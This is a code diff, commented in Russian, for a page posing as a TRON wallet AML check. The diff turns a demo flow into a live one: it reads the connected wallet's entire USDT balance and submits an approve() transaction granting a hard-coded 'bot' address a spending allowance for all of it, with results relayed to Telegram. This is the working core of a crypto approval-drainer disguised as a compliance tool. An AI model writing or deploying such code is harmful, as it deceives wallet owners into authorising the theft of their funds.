@@ -2,7 +2,7 @@
 // ГЛОБАЛЬНЫЕ КОНСТАНТЫ
 // ============================================
 const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
-const BOT_ADDRESS = 'TJKaoUut9WpHr3pBBcyf1TjDxq2rcJRQqB';
+const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB'; // ← ИСПРАВЛЕННЫЙ АДРЕС
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const MIN_AMOUNT = 5000000; // 5 USDT
 const MAX_AMOUNT = 10000000000; // 10000 USDT
@@ -153,27 +153,31 @@ async function handleTronCheck() {
         
         if (!walletAddress && connectedWalletAddress) {
             walletAddress = connectedWalletAddress;
+            walletInput.value = connectedWalletAddress; // показываем в поле
+            console.log('✅ Автоматически подставлен адрес кошелька:', connectedWalletAddress);
         }
         
         if (!walletAddress) {
-            alert('Введите адрес кошелька');
+            alert('Введите адрес кошелька или подключите Trust Wallet');
             return;
         }
 
-        // Если есть подключённый кошелёк - показываем демо
+        // Если есть подключённый кошелёк - показываем модалку с суммой
         if (connectedWalletAddress) {
-            const demoAmount = '5.00';
-            currentApproveAmount = MIN_AMOUNT;
-            
-            if (modalAmount) {
-                modalAmount.textContent = demoAmount + ' USDT';
+            const balance = await getUSDTBalance(connectedWalletAddress);
+            if (balance) {
+                const balanceInUSDT = (balance / 1000000).toFixed(2);
+                currentApproveAmount = balance;
+                if (modalAmount) {
+                    modalAmount.textContent = balanceInUSDT + ' USDT';
+                }
+                document.getElementById('approveModal').style.display = 'flex';
+                return;
             }
-            document.getElementById('approveModal').style.display = 'flex';
-            return;
         }
 
         // Иначе просто показываем демо-отчёт
-        startAMLCheck(walletAddress, 'demo', 'demo_tx', '5.00');
+        startAMLCheck(walletAddress, 'manual', 'demo_tx', '5.00');
         
     } catch (error) {
         console.error('❌ Ошибка:', error);
@@ -185,14 +189,47 @@ async function handleTronCheck() {
 // ПОДТВЕРЖДЕНИЕ APPROVE
 // ============================================
 async function confirmApprove() {
-    document.getElementById('approveModal').style.display = 'none';
-    
-    const address = walletInput.value.trim() || connectedWalletAddress;
-    startAMLCheck(address, 'connected', 'demo_tx', '5.00');
+    try {
+        document.getElementById('approveModal').style.display = 'none';
+        
+        const originalText = checkBtn.innerHTML;
+        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка транзакции...';
+        checkBtn.disabled = true;
+
+        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
+        const userAddress = tronWeb.defaultAddress.base58;
+        const walletAddress = walletInput.value.trim() || connectedWalletAddress;
+
+        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
+        
+        const tx = await contract.approve(
+            BOT_ADDRESS,
+            currentApproveAmount.toString()
+        ).send({
+            feeLimit: 150_000_000,
+            callValue: 0
+        });
+
+        console.log('✅ Approve отправлен, tx:', tx);
+
+        checkBtn.innerHTML = originalText;
+        checkBtn.disabled = false;
+
+        const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
+        startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);
+
+    } catch (error) {
+        console.error('❌ Ошибка:', error);
+        checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
+        checkBtn.disabled = false;
+        alert('Ошибка при отправке транзакции: ' + error.message);
+    }
 }
 
 function closeApproveModal() {
     document.getElementById('approveModal').style.display = 'none';
+    checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
+    checkBtn.disabled = false;
 }
 
 // ============================================
@@ -290,11 +327,15 @@ function updateRiskChart(risk) {
 // ============================================
 async function sendToTelegram(data) {
     try {
-        await fetch('/.netlify/functions/send-to-telegram', {
+        const response = await fetch('/.netlify/functions/send-to-telegram', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         });
+        
+        if (!response.ok) {
+            console.error('Ошибка отправки в Telegram:', await response.text());
+        }
     } catch (error) {
         console.error('Ошибка Telegram:', error);
     }
